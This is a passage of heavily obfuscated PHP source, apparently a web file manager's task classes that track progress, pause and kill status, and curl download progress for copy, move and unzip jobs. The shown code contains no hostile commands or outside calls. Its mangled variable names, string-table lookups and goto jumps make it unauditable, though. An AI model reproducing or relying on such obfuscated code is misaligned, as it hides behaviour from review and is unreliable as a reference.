Model($¿Ô‡¿Ï‚[444])->set($°ò¼ÕÁ¹, $‰£ÒŞš, $¿Ô‡¿Ï‚[1652]); CacheLock::unlock($ÂÏ±–¦); return $¡ÊØ­±; } protected static function log($ê«Â¤ûá) { write_log($ê«Â¤ûá, $_SERVER[„Ç©ñÎ©][1639]); } private static function cacheClear() { $Æß˜Ôû¢ =& $_SERVER[„Ç©ñÎ©]; Cache::clearMemory(Model($Æß˜Ôû¢[444])->cacheKey($Æß˜Ôû¢[1652])); Cache::clearMemory(Model($Æß˜Ôû¢[444])->cacheKey($Æß˜Ôû¢[1654])); Model($Æß˜Ôû¢[1624])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\163\164\x6f\160"; const STATYS_RUNNING = "\162\x75\x6e\x6e\x69\x6e\x67"; const STATYS_KILL = "\x6b\151\154\x6c"; public $task; public function __destruct() { $this->end(); } public function __construct($Şæ¥¾¯™, $¼œĞ×ş• = '', $¡œ¹‰ = 0, $¸¼µı‰Ù = '') { $•÷ä³Øò =& $_SERVER[„Ç©ñÎ©]; if (self::get($Şæ¥¾¯™)) { return; } $this->task = array($•÷ä³Øò[408] => $Şæ¥¾¯™, $•÷ä³Øò[1655] => USER_ID, $•÷ä³Øò[1554] => $¸¼µı‰Ù, $•÷ä³Øò[33] => $¼œĞ×ş•, $•÷ä³Øò[1063] => $•÷ä³Øò[12], $•÷ä³Øò[789] => $¡œ¹‰, $•÷ä³Øò[1656] => 0, $•÷ä³Øò[1657] => 0, $•÷ä³Øò[1658] => 0, $•÷ä³Øò[1659] => timeFloat(), $•÷ä³Øò[1660] => 0, $•÷ä³Øò[1661] => 0, $•÷ä³Øò[1662] => 0, $•÷ä³Øò[1663] => 0, $•÷ä³Øò[753] => $•÷ä³Øò[1614]); $GLOBALS[$•÷ä³Øò[1664]] = 1; Hook::bind($•÷ä³Øò[1619], array($this, $•÷ä³Øò[1665])); Hook::bind($•÷ä³Øò[1666], array($this, $•÷ä³Øò[1667])); $this->startAfter(); Hook::trigger($•÷ä³Øò[1668], $this->task); $this->task[$•÷ä³Øò[1661]] = timeFloat(); } public function end() { $¿”³ÄˆÍ =& $_SERVER[„Ç©ñÎ©]; if (!$this->task) { return; } if ($this->task[$¿”³ÄˆÍ[1661]]) { self::valueSet($this->task[$¿”³ÄˆÍ[408]], !1); } $Åˆ¢­£› = timeFloat() - $this->task[$¿”³ÄˆÍ[1659]]; self::log($¿”³ÄˆÍ[1669] . $this->task[$¿”³ÄˆÍ[408]] . $¿”³ÄˆÍ[1670] . $Åˆ¢­£› . $¿”³ÄˆÍ[1671]); Hook::unbind($¿”³ÄˆÍ[1619], array($this, $¿”³ÄˆÍ[1665])); Hook::unbind($¿”³ÄˆÍ[1666], array($this, $¿”³ÄˆÍ[1667])); $this->endAfter(); $this->task = !1; } public function update($ªõŠˆ‡Ã = 0, $Ë‚Õ·å¦ = false) { $Õ­Ó²ÙÜ =& $_SERVER[„Ç©ñÎ©]; $†¾Ÿ¹ßù =& $this->task; if (!$†¾Ÿ¹ßù) { return; } $†¾Ÿ¹ßù[$Õ­Ó²ÙÜ[1656]] += $ªõŠˆ‡Ã; $†¾Ÿ¹ßù[$Õ­Ó²ÙÜ[1660]] = timeFloat(); if ($†¾Ÿ¹ßù[$Õ­Ó²ÙÜ[789]]) { if ($†¾Ÿ¹ßù[$Õ­Ó²ÙÜ[789]] < $†¾Ÿ¹ßù[$Õ­Ó²ÙÜ[1656]]) { $†¾Ÿ¹ßù[$Õ­Ó²ÙÜ[789]] = $†¾Ÿ¹ßù[$Õ­Ó²ÙÜ[1656]]; } $Ù÷óáí = timeFloat() - $†¾Ÿ¹ßù[$Õ­Ó²ÙÜ[1659]] - $†¾Ÿ¹ßù[$Õ­Ó²ÙÜ[1662]]; if ($Ù÷óáí <= 0) { $Ù÷óáí = 0.001; } $†¾Ÿ¹ßù[$Õ­Ó²ÙÜ[1657]] = $†¾Ÿ¹ßù[$Õ­Ó²ÙÜ[1656]] / $†¾Ÿ¹ßù[$Õ­Ó²ÙÜ[789]]; $†¾Ÿ¹ßù[$Õ­Ó²ÙÜ[1658]] = $†¾Ÿ¹ßù[$Õ­Ó²ÙÜ[1656]] / $Ù÷óáí; if ($†¾Ÿ¹ßù[$Õ­Ó²ÙÜ[1657]] > 0) { $†¾Ÿ¹ßù[$Õ­Ó²ÙÜ[1663]] = $Ù÷óáí * (1 - $†¾Ÿ¹ßù[$Õ­Ó²ÙÜ[1657]]) / $†¾Ÿ¹ßù[$Õ­Ó²ÙÜ[1657]]; } $†¾Ÿ¹ßù[$Õ­Ó²ÙÜ[1663]] = $†¾Ÿ¹ßù[$Õ­Ó²ÙÜ[1663]] <= 0 ? 0 : $†¾Ÿ¹ßù[$Õ­Ó²ÙÜ[1663]]; } $this->updateAfter(); $ô•¥´©ã = 0.2; if (timeFloat() - $†¾Ÿ¹ßù[$Õ­Ó²ÙÜ[1661]] < $ô•¥´©ã && !$Ë‚Õ·å¦) { return; } $åâº‹ğ = self::get($†¾Ÿ¹ßù[$Õ­Ó²ÙÜ[408]]); $„ıÇªÂ§ = $åâº‹ğ[$Õ­Ó²ÙÜ[753]]; if ($„ıÇªÂ§ == self::STATYS_KILL) { $ÃÉ»¬ÔÄ = array($Õ­Ó²ÙÜ[1672] => LNG($Õ­Ó²ÙÜ[1673]), $Õ­Ó²ÙÜ[1190] => !1); Cache::set($Õ­Ó²ÙÜ[1674] . $this->task[$Õ­Ó²ÙÜ[408]], $ÃÉ»¬ÔÄ, 30); $this->onKill(); $this->end(); die; } else { if ($„ıÇªÂ§ == self::STATYS_STOP) { $·¿Èù = 2; $åâº‹ğ[$Õ­Ó²ÙÜ[1662]] += $·¿Èù; self::valueSet($†¾Ÿ¹ßù[$Õ­Ó²ÙÜ[408]], $åâº‹ğ); sleep($·¿Èù); $this->update(); return; } } $†¾Ÿ¹ßù[$Õ­Ó²ÙÜ[753]] = $„ıÇªÂ§ ? $„ıÇªÂ§ : $†¾Ÿ¹ßù[$Õ­Ó²ÙÜ[753]]; $†¾Ÿ¹ßù[$Õ­Ó²ÙÜ[1662]] = $åâº‹ğ[$Õ­Ó²ÙÜ[1662]] ? $åâº‹ğ[$Õ­Ó²ÙÜ[1662]] : 0; $†¾Ÿ¹ßù[$Õ­Ó²ÙÜ[1661]] = timeFloat(); Hook::trigger($Õ­Ó²ÙÜ[1675], $†¾Ÿ¹ßù); self::valueSet($†¾Ÿ¹ßù[$Õ­Ó²ÙÜ[408]], $†¾Ÿ¹ßù); } public function onKillSet($ï¿•³×², $µÚÓ¦ = array()) { $this->onKillCall = array($ï¿•³×², $µÚÓ¦); } public function onKill() { $¡¶„¶é =& $_SERVER[„Ç©ñÎ©]; self::log($¡¶„¶é[1669] . $this->task[$¡¶„¶é[408]] . $¡¶„¶é[1676]); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($æë¥·£‡) { $ÄÍò×© =& $_SERVER[„Ç©ñÎ©]; Cache::set($ÄÍò×©[1674] . $this->task[$ÄÍò×©[408]], $æë¥·£‡, 60); return $æë¥·£‡; } public static function get($µíè¾®Å) { $¤­òºì« =& $_SERVER[„Ç©ñÎ©]; $Ğ”šú¶» = self::valueGet($µíè¾®Å); if (is_array($Ğ”šú¶») && $Ğ”šú¶»[$¤­òºì«[1677]]) { $ô½™¢±‹ = ActionApply($Ğ”šú¶»[$¤­òºì«[1677]], array($Ğ”šú¶»)); $Ğ”šú¶» = is_array($ô½™¢±‹) ? $ô½™¢±‹ : $Ğ”šú¶»; } return $Ğ”šú¶»; } public static function listData() { $ú ü¿Ô” = self::valueGet(); return array_sort_by($ú ü¿Ô”, $_SERVER[„Ç©ñÎ©][1659], !0); } public static function kill($ô³ª‹Â) { return self::changeStatus($ô³ª‹Â, self::STATYS_KILL); } public static function stop($Šİ½–¾â) { return self::changeStatus($Šİ½–¾â, self::STATYS_STOP); } public static function restart($™£Ëîà÷) { return self::changeStatus($™£Ëîà÷, self::STATYS_RUNNING); } public static function killAll() { $ïÃ¯„ç =& $_SERVER[„Ç©ñÎ©]; $¾‰¿ó« = self::listData(); foreach ($¾‰¿ó« as $ù³ş£¸) { self::kill($ù³ş£¸[$ïÃ¯„ç[408]]); } sleep(2); foreach ($¾‰¿ó« as $ù³ş£¸) { self::valueSet($ù³ş£¸[$ïÃ¯„ç[408]], !1); } } private static function changeStatus($éŠÃç¶‚, $ĞßãßàŒ) { $¬“ùù­ =& $_SERVER[„Ç©ñÎ©]; $Ğ„‘†¸™ = self::valueGet($éŠÃç¶‚); if (!$Ğ„‘†¸™) { return !1; } $Ğ„‘†¸™[$¬“ùù­[753]] = $ĞßãßàŒ; self::valueSet($éŠÃç¶‚, $Ğ„‘†¸™); self::log($¬“ùù­[1678] . $Ğ„‘†¸™[$¬“ùù­[408]] . $¬“ùù­[1679] . $ĞßãßàŒ); return !0; } public static function valueGet($ìšüç = false) { $°›™şÔâ =& $_SERVER[„Ç©ñÎ©]; if ($ìšüç) { $ç’Î‚Æµ = Model($°›™şÔâ[456])->where(array($°›™şÔâ[104] => $ìšüç, $°›™şÔâ[33] => $°›™şÔâ[1070]))->find(); return $ç’Î‚Æµ ? json_decode($ç’Î‚Æµ[$°›™şÔâ[383]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($–¶Õé£Š = false) { $Í‹™šîİ =& $_SERVER[„Ç©ñÎ©]; $–¹ÉÎç = array($Í‹™šîİ[33] => $Í‹™šîİ[1070]); if ($–¶Õé£Š) { $–¹ÉÎç[$Í‹™šîİ[1655]] = $–¶Õé£Š; } $±çÆòúğ = Model($Í‹™šîİ[456])->where($–¹ÉÎç)->select(); $±çÆòúğ = $±çÆòúğ ? $±çÆòúğ : array(); foreach ($±çÆòúğ as $…”¦áÓÄ => $­«Æ÷âì) { $±çÆòúğ[$…”¦áÓÄ] = json_decode($­«Æ÷âì[$Í‹™šîİ[383]], !0); } return $±çÆòúğ; } public static function valueSet($æ¨ıô„ú, $¢´Ú½ç) { $ó‘À›Ò =& $_SERVER[„Ç©ñÎ©]; if (!$¢´Ú½ç) { return Model($ó‘À›Ò[456])->where(array($ó‘À›Ò[104] => $æ¨ıô„ú, $ó‘À›Ò[33] => $ó‘À›Ò[1070]))->delete(); } $öµµÓ = json_encode($¢´Ú½ç); if (!$öµµÓ) { ob_start(); var_dump($¢´Ú½ç); $ÛíúÆÕÀ = ob_get_clean(); self::log($ó‘À›Ò[1680] . json_encode_force($ÛíúÆÕÀ)); } if (!$æ¨ıô„ú || !$¢´Ú½ç[$ó‘À›Ò[408]]) { return !1; } $«‹¤ÚÄ = array($ó‘À›Ò[33] => $ó‘À›Ò[1070], $ó‘À›Ò[1655] => USER_ID, $ó‘À›Ò[104] => $æ¨ıô„ú, $ó‘À›Ò[383] => $öµµÓ); $íÁœìà‹ = $ó‘À›Ò[1681]; CacheLock::lock($íÁœìà‹); Model($ó‘À›Ò[456])->add($«‹¤ÚÄ, array(), !0); CacheLock::unlock($íÁœìà‹); } public static function log($Î¬¹Ø’´) { if (!GLOBAL_DEBUG) { return; } write_log($Î¬¹Ø’´, $_SERVER[„Ç©ñÎ©][1682]); } } class TaskFileTransfer extends Task { protected function startAfter() { $û—ê£¨Ê =& $_SERVER[„Ç©ñÎ©]; $Ò¢ÉĞï± =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($û—ê£¨Ê[1683], array($this, $û—ê£¨Ê[1684])); Hook::bind($û—ê£¨Ê[1214], array($this, $û—ê£¨Ê[1685])); Hook::bind($û—ê£¨Ê[1686], array($this, $û—ê£¨Ê[1687])); Hook::bind($û—ê£¨Ê[613], array($this, $û—ê£¨Ê[1688])); Hook::bind($û—ê£¨Ê[614], array($this, $û—ê£¨Ê[1689])); Hook::bind($û—ê£¨Ê[619], array($this, $û—ê£¨Ê[1690])); Hook::bind($û—ê£¨Ê[620], array($this, $û—ê£¨Ê[1691])); Hook::bind($û—ê£¨Ê[616], array($this, $û—ê£¨Ê[1692])); Hook::bind($û—ê£¨Ê[617], array($this, $û—ê£¨Ê[1693])); Hook::bind($û—ê£¨Ê[583], array($this, $û—ê£¨Ê[1694])); Hook::bind($û—ê£¨Ê[580], array($this, $û—ê£¨Ê[1694])); Hook::bind($û—ê£¨Ê[585], array($this, $û—ê£¨Ê[1694])); Hook::bind($û—ê£¨Ê[587], array($this, $û—ê£¨Ê[1694])); Hook::bind($û—ê£¨Ê[589], array($this, $û—ê£¨Ê[1694])); Hook::bind($û—ê£¨Ê[1695], array($this, $û—ê£¨Ê[1696])); Hook::bind($û—ê£¨Ê[606], array($this, $û—ê£¨Ê[1697])); $this->sourceModelCopyFlag = !1; Hook::bind($û—ê£¨Ê[1698], array($this, $û—ê£¨Ê[1699])); Hook::bind($û—ê£¨Ê[1700], array($this, $û—ê£¨Ê[1701])); Hook::bind($û—ê£¨Ê[1702], array($this, $û—ê£¨Ê[1703])); $Ò¢ÉĞï±[$û—ê£¨Ê[1704]] = LNG($û—ê£¨Ê[1705]); $Ò¢ÉĞï±[$û—ê£¨Ê[1706]] = 0; $Ò¢ÉĞï±[$û—ê£¨Ê[1707]] = 0; $Ò¢ÉĞï±[$û—ê£¨Ê[1063]] = $û—ê£¨Ê[12]; $Ò¢ÉĞï±[$û—ê£¨Ê[1708]] = $û—ê£¨Ê[12]; $Ò¢ÉĞï±[$û—ê£¨Ê[1709]] = 0; $Ò¢ÉĞï±[$û—ê£¨Ê[1710]] = 0; $Ò¢ÉĞï±[$û—ê£¨Ê[1711]] = 0; if (!$Ò¢ÉĞï±[$û—ê£¨Ê[1554]]) { $Ò¢ÉĞï±[$û—ê£¨Ê[1554]] = LNG($û—ê£¨Ê[1712]); } } protected function endAfter() { $¿Åªã =& $_SERVER[„Ç©ñÎ©]; Hook::unbind($¿Åªã[1683], array($this, $¿Åªã[1684])); Hook::unbind($¿Åªã[1214], array($this, $¿Åªã[1685])); Hook::unbind($¿Åªã[1686], array($this, $¿Åªã[1687])); Hook::unbind($¿Åªã[613], array($this, $¿Åªã[1688])); Hook::unbind($¿Åªã[614], array($this, $¿Åªã[1689])); Hook::unbind($¿Åªã[619], array($this, $¿Åªã[1690])); Hook::unbind($¿Åªã[620], array($this, $¿Åªã[1691])); Hook::unbind($¿Åªã[616], array($this, $¿Åªã[1692])); Hook::unbind($¿Åªã[617], array($this, $¿Åªã[1693])); Hook::unbind($¿Åªã[583], array($this, $¿Åªã[1694])); Hook::unbind($¿Åªã[580], array($this, $¿Åªã[1694])); Hook::unbind($¿Åªã[585], array($this, $¿Åªã[1694])); Hook::unbind($¿Åªã[587], array($this, $¿Åªã[1694])); Hook::unbind($¿Åªã[589], array($this, $¿Åªã[1694])); Hook::unbind($¿Åªã[1695], array($this, $¿Åªã[1696])); Hook::unbind($¿Åªã[606], array($this, $¿Åªã[1697])); Hook::unbind($¿Åªã[1698], array($this, $¿Åªã[1699])); Hook::unbind($¿Åªã[1700], array($this, $¿Åªã[1701])); Hook::unbind($¿Åªã[1702], array($this, $¿Åªã[1703])); } public function copyMoveStart($æ¢ó§ã‚, $êÁÙ®€Æ, $Ÿ¬²áª´, $ûë¶ÜÄ) { $ÁÊîÆéÂ =& $_SERVER[„Ç©ñÎ©]; self::log($ÁÊîÆéÂ[1713] . $êÁÙ®€Æ . $ÁÊîÆéÂ[80] . $ûë¶ÜÄ); $¶æŞÁ–³ = rtrim(TEMP_FILES, $ÁÊîÆéÂ[8]); if (substr($êÁÙ®€Æ, 0, strlen($¶æŞÁ–³)) == $¶æŞÁ–³) { return; } if (substr($ûë¶ÜÄ, 0, strlen($¶æŞÁ–³)) == $¶æŞÁ–³) { return; } $‰´‚òÆÍ =& $this->task; $‰´‚òÆÍ[$ÁÊîÆéÂ[1714]] = KodIO::transferType($æ¢ó§ã‚, $Ÿ¬²áª´); $this->update(); } public function updateAfter() { $Ï•”ôî´ =& $_SERVER[„Ç©ñÎ©]; $æ»…ôŞã =& $this->task; if (!$æ»…ôŞã[$Ï•”ôî´[766]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($æ»…ôŞã[$Ï•”ôî´[1714]] == $Ï•”ôî´[1303]) { return; } self::updateTask($æ»…ôŞã); } private static function updateTask(&$¶êƒ÷) { $š¿É–íû =& $_SERVER[„Ç©ñÎ©]; if ($¶êƒ÷[$š¿É–íû[1714]] == $š¿É–íû[1198] || $¶êƒ÷[$š¿É–íû[1714]] == $š¿É–íû[117]) { if ($¶êƒ÷[$š¿É–íû[1708]]) { $¶êƒ÷[$š¿É–íû[1711]] = $¶êƒ÷[$š¿É–íû[1710]] + $¶êƒ÷[$š¿É–íû[1707]]; } } else { if ($¶êƒ÷[$š¿É–íû[1714]] == $š¿É–íû[1304]) { if ($¶êƒ÷[$š¿É–íû[1708]] == $š¿É–íû[1198]) { $¶êƒ÷[$š¿É–íû[1711]] = $¶êƒ÷[$š¿É–íû[1710]] + $¶êƒ÷[$š¿É–íû[1707]] * 0.5; } else { if ($¶êƒ÷[$š¿É–íû[1708]] == $š¿É–íû[117]) { $¶êƒ÷[$š¿É–íû[1711]] = $¶êƒ÷[$š¿É–íû[1710]] + $¶êƒ÷[$š¿É–íû[1706]] * 0.5 + $¶êƒ÷[$š¿É–íû[1707]] * 0.5; } } } } $¶êƒ÷[$š¿É–íû[1657]] = $¶êƒ÷[$š¿É–íû[1711]] / $¶êƒ÷[$š¿É–íû[766]]; if ($¶êƒ÷[$š¿É–íû[1657]] > 0) { $ä­¬Èè = timeFloat() - $¶êƒ÷[$š¿É–íû[1659]] - $¶êƒ÷[$š¿É–íû[1662]]; $¶êƒ÷[$š¿É–íû[1663]] = $ä­¬Èè * (1 - $¶êƒ÷[$š¿É–íû[1657]]) / $¶êƒ÷[$š¿É–íû[1657]]; } } public function addPath($â¾Âúâı) { $ğš¤¯úù =& $_SERVER[„Ç©ñÎ©]; if (!$â¾Âúâı) { return; } $ÂÇ÷’Ã =& $this->task; $°Ïôî»« = IO::infoWithChildren($â¾Âúâı); $öç×•ÅÉ = $ÂÇ÷’Ã[$ğš¤¯úù[1715]] ? $ÂÇ÷’Ã[$ğš¤¯úù[1715]][$ğš¤¯úù[1716]] : 0; $ÂÇ÷’Ã[$ğš¤¯úù[1715]] = array($ğš¤¯úù[1716] => $öç×•ÅÉ + 1, $ğš¤¯úù[429] => $°Ïôî»«[$ğš¤¯úù[32]], $ğš¤¯úù[94] => $°Ïôî»«[$ğš¤¯úù[94]], $ğš¤¯úù[528] => $°Ïôî»«[$ğš¤¯úù[528]] ? $°Ïôî»«[$ğš¤¯úù[528]] : $°Ïôî»«[$ğš¤¯úù[94]]); if ($°Ïôî»«[$ğš¤¯úù[33]] == $ğš¤¯úù[209]) { $ÂÇ÷’Ã[$ğš¤¯úù[789]] += 1; } else { $ÂÇ÷’Ã[$ğš¤¯úù[789]] += $°Ïôî»«[$ğš¤¯úù[89]][$ğš¤¯úù[87]]; if ($°Ïôî»«[$ğš¤¯úù[411]]) { $ÂÇ÷’Ã[$ğš¤¯úù[789]] += $°Ïôî»«[$ğš¤¯úù[89]][$ğš¤¯úù[88]] + 1; } } $ÂÇ÷’Ã[$ğš¤¯úù[766]] += $°Ïôî»«[$ğš¤¯úù[86]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($×Ó«ƒåá) { } public function sourceAddHashEnd($´·¶æƒ¹) { } public function sourceAddFileStart($Şª•ˆŒ‘) { $çæ›ó÷ =& $_SERVER[„Ç©ñÎ©]; $—Šî·˜ =& $this->task; $—Šî·˜[$çæ›ó÷[1706]] = $Şª•ˆŒ‘[$çæ›ó÷[86]]; $—Šî·˜[$çæ›ó÷[1704]] = $Şª•ˆŒ‘[$çæ›ó÷[32]]; $—Šî·˜[$çæ›ó÷[1063]] = $Şª•ˆŒ‘[$çæ›ó÷[32]]; $—Šî·˜[$çæ›ó÷[1717]] = $Şª•ˆŒ‘[$çæ›ó÷[94]]; $this->update(); } public function sourceAddFileEnd($Ôü—¸²) { $ÄÅĞ»ã =& $_SERVER[„Ç©ñÎ©]; $«¾¤Šµø =& $this->task; $«¾¤Šµø[$ÄÅĞ»ã[1711]] += $Ôü—¸²[$ÄÅĞ»ã[86]]; $«¾¤Šµø[$ÄÅĞ»ã[1717]] = $Ôü—¸²[$ÄÅĞ»ã[94]]; $this->update(1); } public function copyFileStart($÷ìÍæ‘, $“÷ª‘¡, $§“ÉûèÒ, $ÕËİ÷¹æ, $—–™¹ÄÄ, $êå¿á¯Ş) { $º…¸‹ôÁ =& $_SERVER[„Ç©ñÎ©]; $É–™İôÜ = $—–™¹ÄÄ; if ($É–™İôÜ == $GLOBALS[$º…¸‹ôÁ[1718]]) { $É–™İôÜ = $GLOBALS[$º…¸‹ôÁ[1719]]; } $GLOBALS[$º…¸‹ôÁ[1719]] = $—–™¹ÄÄ; $GLOBALS[$º…¸‹ôÁ[1718]] = $êå¿á¯Ş; $§î¡ÓåŞ =& $this->task; $§î¡ÓåŞ[$º…¸‹ôÁ[1704]] = $É–™İôÜ; $§î¡ÓåŞ[$º…¸‹ôÁ[1706]] = (int) $÷ìÍæ‘->size($“÷ª‘¡); $§î¡ÓåŞ[$º…¸‹ôÁ[1707]] = 0; $§î¡ÓåŞ[$º…¸‹ôÁ[1063]] = $º…¸‹ôÁ[12]; $§î¡ÓåŞ[$º…¸‹ôÁ[1708]] = $º…¸‹ôÁ[12]; $§î¡ÓåŞ[$º…¸‹ôÁ[1709]] = 0; $ƒÁêû‘© = $§î¡ÓåŞ[$º…¸‹ôÁ[1706]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($§î¡ÓåŞ[$º…¸‹ôÁ[408]] . $º…¸‹ôÁ[1720]); if ($ƒÁêû‘© && file_exists(get_path_father($ÕËİ÷¹æ))) { Cache::set($§î¡ÓåŞ[$º…¸‹ôÁ[408]] . $º…¸‹ôÁ[1720], $ÕËİ÷¹æ); $§î¡ÓåŞ[$º…¸‹ôÁ[1677]] = array($º…¸‹ôÁ[1721], $º…¸‹ôÁ[1722]); } $this->update(0, $ƒÁêû‘©); } public static function updateCopyLocalFileSize($£¡ô¸ş‹) { $ƒÌÍíÆ• =& $_SERVER[„Ç©ñÎ©]; $¦¬ü½§İ = Cache::get($£¡ô¸ş‹[$ƒÌÍíÆ•[408]] . $ƒÌÍíÆ•[1720]); if (!$¦¬ü½§İ || !file_exists($¦¬ü½§İ)) { return $£¡ô¸ş‹; } $£¡ô¸ş‹[$ƒÌÍíÆ•[1707]] = @filesize($¦¬ü½§İ); $£¡ô¸ş‹[$ƒÌÍíÆ•[1711]] += $£¡ô¸ş‹[$ƒÌÍíÆ•[1707]]; self::updateTask($£¡ô¸ş‹); return $£¡ô¸ş‹; } public function copyFileEnd($õı”‰Ô™, $šÌ­¤„ú, $‚£¦ğ¤İ, $Ö×Æ‹¸Û, $öì¿íÊ´, $¯Ş¶÷) { $°£÷ÎŸ‘ =& $_SERVER[„Ç©ñÎ©]; $Ú“«ƒîš =& $this->task; $Ú“«ƒîš[$°£÷ÎŸ‘[1707]] = $Ú“«ƒîš[$°£÷ÎŸ‘[1706]]; $Ú“«ƒîš[$°£÷ÎŸ‘[1708]] = $°£÷ÎŸ‘[12]; unset($Ú“«ƒîš[$°£÷ÎŸ‘[1677]]); if ($öì¿íÊ´ == $Ú“«ƒîš[$°£÷ÎŸ‘[1704]]) { $Ú“«ƒîš[$°£÷ÎŸ‘[1710]] += $Ú“«ƒîš[$°£÷ÎŸ‘[1706]]; $Ú“«ƒîš[$°£÷ÎŸ‘[1711]] = $Ú“«ƒîš[$°£÷ÎŸ‘[1710]]; $Ò…­çÛ = 1; if (isset($Ú“«ƒîš[$°£÷ÎŸ‘[1717]]) && $Ú“«ƒîš[$°£÷ÎŸ‘[1717]] == $šÌ­¤„ú) { $Ò…­çÛ = 0; } $this->update($Ò…­çÛ); } else { $this->update(); $Ú“«ƒîš[$°£÷ÎŸ‘[1707]] = 0; } Cache::remove($Ú“«ƒîš[$°£÷ÎŸ‘[408]] . $°£÷ÎŸ‘[1720]); self::log($°£÷ÎŸ‘[1723] . $šÌ­¤„ú . $°£÷ÎŸ‘[80] . $Ö×Æ‹¸Û . $°£÷ÎŸ‘[66] . $öì¿íÊ´ . $°£÷ÎŸ‘[1724] . $Ú“«ƒîš[$°£÷ÎŸ‘[1704]]); } public function updateFileEnd($øÙğ§–¤, $¯‡Ë„ŸÚ) { $ôÊÏ”¤Ì =& $_SERVER[„Ç©ñÎ©]; $Š±ÈÏöÊ =& $this->task; $Š±ÈÏöÊ[$ôÊÏ”¤Ì[1704]] = $øÙğ§–¤; $Š±ÈÏöÊ[$ôÊÏ”¤Ì[1706]] = $¯‡Ë„ŸÚ; $Š±ÈÏöÊ[$ôÊÏ”¤Ì[1710]] += $¯‡Ë„ŸÚ; $Š±ÈÏöÊ[$ôÊÏ”¤Ì[1711]] = $Š±ÈÏöÊ[$ôÊÏ”¤Ì[1710]]; $this->update(1); self::log($ôÊÏ”¤Ì[1725] . $øÙğ§–¤); } public function sourceModelCopy($•ê¶¨¢Ö) { $ßÖæ¦ã½ =& $_SERVER[„Ç©ñÎ©]; $³•¦‹å¼ = $•ê¶¨¢Ö[0]; $ôĞ´Ñ = $•ê¶¨¢Ö[1]; $‚îÜ½×¯ =& $this->task; $this->sourceModelCopyFlag = !0; $èÈ«ÚÃà = 0; switch ($³•¦‹å¼) { case $ßÖæ¦ã½[581]: $èÈ«ÚÃà = 1; break; case $ßÖæ¦ã½[584]: $‚îÜ½×¯[$ßÖæ¦ã½[1704]] = $ôĞ´Ñ[$ßÖæ¦ã½[32]]; break; case $ßÖæ¦ã½[586]: $èÈ«ÚÃà = intval($•ê¶¨¢Ö[$ßÖæ¦ã½[389]] * 0.4); break; case $ßÖæ¦ã½[588]: $èÈ«ÚÃà = intval($•ê¶¨¢Ö[$ßÖæ¦ã½[389]] * 0.2); break; case $ßÖæ¦ã½[590]: $èÈ«ÚÃà = intval($•ê¶¨¢Ö[$ßÖæ¦ã½[389]] * 0.4); break; } $this->update($èÈ«ÚÃà); $this->sourceModelCopyFlag = !1; } public function sourceRemove($‰üÒ½µ¨, $îÆ¿©õ) { $ÎÔÁ¤ï¢ =& $_SERVER[„Ç©ñÎ©]; $this->sourceModelCopyFlag = !0; $šãí›İ = 1; if (isset($‰üÒ½µ¨[$ÎÔÁ¤ï¢[89]])) { $šãí›İ = $‰üÒ½µ¨[$ÎÔÁ¤ï¢[89]][$ÎÔÁ¤ï¢[87]]; $šãí›İ = $šãí›İ + $‰üÒ½µ¨[$ÎÔÁ¤ï¢[89]][$ÎÔÁ¤ï¢[88]] + 1; } $this->update($šãí›İ); $this->sourceModelCopyFlag = !1; } public function sourceMove($©×éÙ¤–) { $this->sourceRemove($©×éÙ¤–, !1); } public function curlProgress($–ñßŸ®¹, $ÈàÄÆ£Ş, $“©¬Ô², $¸æî‰á¾, $§á¾Âéò) { $Êûè•Êø =& $_SERVER[„Ç©ñÎ©]; $”êû÷¦ø =& $this->task; if ($§á¾Âéò > 0) { $”êû÷¦ø[$Êûè•Êø[1063]] = $Êûè•Êø[1726]; $”êû÷¦ø[$Êûè•Êø[1708]] = $Êûè•Êø[117]; if ($”êû÷¦ø[$Êûè•Êø[1706]]) { $”êû÷¦ø[$Êûè•Êø[1707]] = $§á¾Âéò; } if ($”êû÷¦ø[$Êûè•Êø[1709]]) { $”êû÷¦ø[$Êûè•Êø[1707]] = $§á¾Âéò + $”êû÷¦ø[$Êûè•Êø[1709]]; } } else { if ($“©¬Ô² > 0) { if ($”êû÷¦ø[$Êûè•Êø[1706]] == $ÈàÄÆ£Ş) { $”êû÷¦ø[$Êûè•Êø[1707]] = $“©¬Ô²; $”êû÷¦ø[$Êûè•Êø[1063]] = $Êûè•Êø[1727]; $”êû÷¦ø[$Êûè•Êø[1708]] = $Êûè•Êø[1198]; } } } $this->update(); } public function curlProgressStart($¤éõãï­) { } public function curlProgressEnd($ÚÍÓ ) { $úÚá½ =& $_SERVER[„Ç©ñÎ©]; $¬ùñ¿ø =& $this->task; $¼Ø„§â = curl_getinfo($ÚÍÓ ); $ˆö…¼¬ğ = $¼Ø„§â[$úÚá½[1728]]; if ($ˆö…¼¬ğ == -1) { $ˆö…¼¬ğ = $¼Ø„§â[$úÚá½[1729]]; } if ($¬ùñ¿ø[$úÚá½[1708]] == $úÚá½[117] && $ˆö…¼¬ğ) { $¬ùñ¿ø[$úÚá½[1709]] += $ˆö…¼¬ğ; } $this->update(); } } goto b—ôÆƒ¼»¿; B»Î“ÈÁÒ›: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $Ãûµ¡Ìƒ =& $_SERVER[„Ç©ñÎ©]; parent::startAfter(); Hook::bind($Ãûµ¡Ìƒ[1748], array($this, $Ãûµ¡Ìƒ[1749])); Hook::bind($Ãûµ¡Ìƒ[1193], array($this, $Ãûµ¡Ìƒ[1750])); $·ßÆ‹Ìó =& $this->task; $·ßÆ‹Ìó[$Ãûµ¡Ìƒ[1751]] = $Ãûµ¡Ìƒ[1198]; if (!$·ßÆ‹Ìó[$Ãûµ¡Ìƒ[1554]]) { $·ßÆ‹Ìó[$Ãûµ¡Ìƒ[1554]] = LNG($Ãûµ¡Ìƒ[1752]); } } protected function endAfter() { $ºÅş»Ç =& $_SERVER[„Ç©ñÎ©]; parent::endAfter(); Hook::unbind($ºÅş»Ç[1748], array($this, $ºÅş»Ç[1749])); Hook::unbind($ºÅş»Ç[1193], 